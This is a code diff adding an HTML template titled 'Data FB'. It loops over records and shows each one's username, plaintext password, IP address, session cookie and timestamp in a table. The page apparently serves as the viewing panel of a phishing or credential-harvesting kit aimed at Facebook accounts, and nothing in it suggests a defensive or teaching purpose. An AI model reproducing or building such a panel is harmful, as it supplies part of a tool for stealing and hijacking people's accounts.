@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+table {
+  font-family: arial, sans-serif;
+  border-collapse: collapse;
+  width: 100%;
+}
+
+td, th {
+  border: 1px solid #dddddd;
+  text-align: left;
+  padding: 8px;
+}
+
+tr:nth-child(even) {
+  background-color: #dddddd;
+}
+</style>
+</head>
+<body>
+
+<h2>Data FB</h2>
+
+<table>
+  <tr>
+    <th>Id</th>
+    <th>Username</th>
+    <th>Password</th>
+    <th>IP</th>
+    <th>Cookie</th>
+    <th>Time</th>
+  </tr>
+  {%for i in range(0, len_data)%}
+    <tr>
+    <td>{{data[i][0]}}</td>
+    <td>{{data[i][1]}}</td>
+    <td>{{data[i][2]}}</td>
+    <td>{{data[i][5]}}</td>
+    <td>{{data[i][3]}}</td>
+    <td>{{data[i][4]}}</td>
+  </tr>
+  {%endfor%}
+ 
+</table>
+
+</body>
+</html>
+
